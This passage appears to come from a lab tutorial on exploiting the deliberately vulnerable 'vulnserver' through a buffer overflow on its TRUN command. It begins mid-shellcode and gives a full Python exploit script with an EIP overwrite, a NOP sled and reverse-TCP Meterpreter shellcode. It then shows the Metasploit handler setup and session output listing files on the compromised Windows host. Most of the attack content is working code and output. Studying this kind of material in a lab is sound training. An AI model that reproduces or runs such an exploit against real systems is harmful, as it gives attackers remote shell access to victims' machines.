buf += b"\x95\xb5\xfe\xb0\xfe\xdd\x75\x55\x4c\x7c\x89\x7c"
buf += b"\x10\x20\x8a\x73\x89\xd3\xf1\xfc\x2e\x14\x06\x15"
buf += b"\x4b\x15\x06\x19\x6d\x2a\xd0\x20\x1b\x6d\xe0\x16"
buf += b"\x14\xd8\x45\x3e\xbf\x22\xd9\x40\xea"
```

Copy the shell code into exploit.py, so the final code will looks likes this

```python
#!/usr/bin/env python3

import socket
import struct

s = socket.socket()
s.connect(("192.168.231.130", 9999))

total_length = 2984
offset = 2003
new_eip = struct.pack("<I", 0x62501203)
nop_sled = b"\x90" * 16

buf =  b""
buf += b"\xd9\xc2\xbb\x55\xef\x23\xaa\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x59\x31\x5a\x19\x83\xc2\x04\x03\x5a"
buf += b"\x15\xb7\x1a\xdf\x42\xb8\xe5\x20\x93\xa6\x6c\xc5"
buf += b"\xa2\xf4\x0b\x8d\x97\xc8\x58\xc3\x1b\xa3\x0d\xf0"
buf += b"\x2c\x04\xfb\xde\xb9\x18\xd4\x2f\x41\xed\xe4\xfc"
buf += b"\x81\x6c\x99\xfe\xd5\x4e\xa0\x30\x28\x8f\xe5\x86"
buf += b"\x46\x60\xbb\x93\xfb\x6e\x6b\x2f\xb9\xb2\x92\xff"
buf += b"\xb5\x8a\xec\x7a\x09\x7e\x41\x84\x5a\xf5\x01\xa6"
buf += b"\xd1\x41\xaa\xa7\x36\x01\x4f\x6e\xcc\x9d\x7e\x8e"
buf += b"\x64\x56\xb4\xfb\x76\xbe\x84\x3b\xd4\xff\x28\xb6"
buf += b"\x24\x38\x8e\x29\x53\x32\xec\xd4\x64\x81\x8e\x02"
buf += b"\xe0\x15\x28\xc0\x52\xf1\xc8\x05\x04\x72\xc6\xe2"
buf += b"\x42\xdc\xcb\xf5\x87\x57\xf7\x7e\x26\xb7\x71\xc4"
buf += b"\x0d\x13\xd9\x9e\x2c\x02\x87\x71\x50\x54\x6f\x2d"
buf += b"\xf4\x1f\x82\x38\x88\xe0\x5c\x45\xd4\x76\x90\x88"
buf += b"\xe7\x86\xbe\x9b\x94\xb4\x61\x30\x33\xf4\xea\x9e"
buf += b"\xc4\x8d\xfd\x20\x1a\x35\x6d\xdf\x9b\x45\xa7\x24"
buf += b"\xcf\x15\xdf\x8d\x70\xfe\x1f\x31\xa5\x6a\x2a\xa5"
buf += b"\x86\xc2\xcd\xb1\x6f\x10\x12\xab\x33\x9d\xf4\x9b"
buf += b"\x9b\xcd\xa8\x5b\x4c\xad\x18\x34\x86\x22\x46\x24"
buf += b"\xa9\xe9\xef\xcf\x46\x47\x47\x78\xfe\xc2\x13\x19"
buf += b"\xff\xd9\x59\x19\x8b\xeb\x9e\xd4\x7c\x9e\x8c\x01"
buf += b"\x1b\x60\x4d\xd2\x8e\x60\x27\xd6\x18\x37\xdf\xd4"
buf += b"\x7d\x7f\x40\x26\xa8\xfc\x87\xd8\x2d\x34\xf3\xef"
buf += b"\xbb\x78\x6b\x10\x2c\x78\x6b\x46\x26\x78\x03\x3e"
buf += b"\x12\x2b\x36\x41\x8f\x58\xeb\xd4\x30\x08\x5f\x7e"
buf += b"\x59\xb6\x86\x48\xc6\x49\xed\xca\x01\xb5\x73\xe5"
buf += b"\xa9\xdd\x8b\xb5\x49\x1d\xe6\x35\x1a\x75\xfd\x1a"
buf += b"\x95\xb5\xfe\xb0\xfe\xdd\x75\x55\x4c\x7c\x89\x7c"
buf += b"\x10\x20\x8a\x73\x89\xd3\xf1\xfc\x2e\x14\x06\x15"
buf += b"\x4b\x15\x06\x19\x6d\x2a\xd0\x20\x1b\x6d\xe0\x16"
buf += b"\x14\xd8\x45\x3e\xbf\x22\xd9\x40\xea"

shellcode = buf

payload = [
    b"TRUN /.:/",
    b"A" * offset,
		new_eip,
		nop_sled,
        shellcode,
		b"C" * (total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode)) # substract with the length of all_characters to keep the payload length to 2984
]
payload = b"".join(payload)
s.send(payload)
s.close()
```

## Testing Our Exploit

Let’s try to run our exploit against vulnserver. First we need to run metasploit to listen for the reverse_tcp connection

```bash
# msfconsole

               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,
 lMMMMMMMMMMk.                         .kMMO'
  dMMMMMMMMMMWd'                         ..
   cWMMMMMMMMMMMNxc'.                ##########
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:
                                :::::::+:
                      Metasploit

       =[ metasploit v6.2.26-dev                          ]
+ -- --=[ 2264 exploits - 1189 auxiliary - 404 post       ]
+ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Search can apply complex filters such as
search cve:2009 type:exploit, see all the filters
with help search
Metasploit Documentation: https://docs.metasploit.com/

msf6 >
msf6 > **use multi/handler**
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > **set PAYLOAD windows/meterpreter/reverse_tcp**
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > **set LHOST eth0**
LHOST => eth0
msf6 exploit(multi/handler) > **set LPORT 4444**
LPORT => 4444
msf6 exploit(multi/handler) > **run**

[*] Started reverse TCP handler on 192.168.187.139:4444
```

Restart our Vulnserver from the Immunity Debugger then run our exploit.py

Back to our metasploit you see that there is a terminal session opened from our windows machine into our kali. check the current user using the getuid command.

```bash
[*] Started reverse TCP handler on 192.168.231.132:4444
[*] Sending stage (175686 bytes) to 192.168.231.130
[*] Meterpreter session 2 opened (192.168.231.132:4444 -> 192.168.231.130:49687) at 2023-01-28 22:21:26 -0500

meterpreter > getuid
Server username: MSEDGEWIN10\IEUser
meterpreter > dir
Listing: C:\tools\vulnserver
============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  519    fil   2022-06-13 08:31:03 -0400  COMPILING.TXT
100666/rw-rw-rw-  1501   fil   2022-06-13 08:31:03 -0400  LICENSE.TXT
100666/rw-rw-rw-  3254   fil   2022-06-13 08:31:03 -0400  essfunc.c
100666/rw-rw-rw-  16601  fil   2022-06-13 08:31:04 -0400  essfunc.dll
100666/rw-rw-rw-  3648   fil   2022-06-13 08:31:04 -0400  readme.md
100666/rw-rw-rw-  10935  fil   2022-06-13 08:31:04 -0400  vulnserver.c
100777/rwxrwxrwx  29624  fil   2022-06-13 08:31:04 -0400  vulnserver.exe
```

We can then browse to directories. For example here I list everything in C Drive inside the Windows machine that run the Vulnserver.

```bash
meterpreter > dir c:
Listing: c:
===========

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2022-04-30 12:26:19 -0400  $Recycle.Bin
040777/rwxrwxrwx  0       dir   2019-03-19 09:22:19 -0400  BGinfo
100666/rw-rw-rw-  1       fil   2018-09-15 03:28:52 -0400  BOOTNXT
100444/r--r--r--  8192    fil   2019-03-19 17:54:53 -0400  BOOTSECT.BAK
040777/rwxrwxrwx  8192    dir   2022-10-21 02:41:42 -0400  Boot
040777/rwxrwxrwx  0       dir   2019-03-19 16:59:25 -0400  Documents and Settings
040777/rwxrwxrwx  0       dir   2022-10-17 02:40:55 -0400  PerfLogs
040555/r-xr-xr-x  8192    dir   2022-06-13 08:29:56 -0400  Program Files
040555/r-xr-xr-x  4096    dir   2022-10-21 02:41:59 -0400  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2022-05-13 02:34:31 -0400  ProgramData
040777/rwxrwxrwx  0       dir   2022-06-03 22:04:01 -0400  Python
040777/rwxrwxrwx  4096    dir   2022-06-13 08:44:49 -0400  Python27
040777/rwxrwxrwx  0       dir   2019-03-19 16:56:50 -0400  Recovery
040777/rwxrwxrwx  4096    dir   2019-03-19 09:02:23 -0400  System Volume Information
040555/r-xr-xr-x  4096    dir   2019-03-19 09:01:28 -0400  Users
040777/rwxrwxrwx  16384   dir   2022-10-17 02:41:01 -0400  Windows
100444/r--r--r--  409162  fil   2022-10-16 18:03:42 -0400  bootmgr
040777/rwxrwxrwx  4096    dir   2022-06-16 11:36:58 -0400  emu8086
000000/---------  0       fif   1969-12-31 19:00:00 -0500  pagefile.sys
000000/---------  0       fif   1969-12-31 19:00:00 -0500  swapfile.sys
040777/rwxrwxrwx  0       dir   2022-06-13 08:31:27 -0400  tools
```
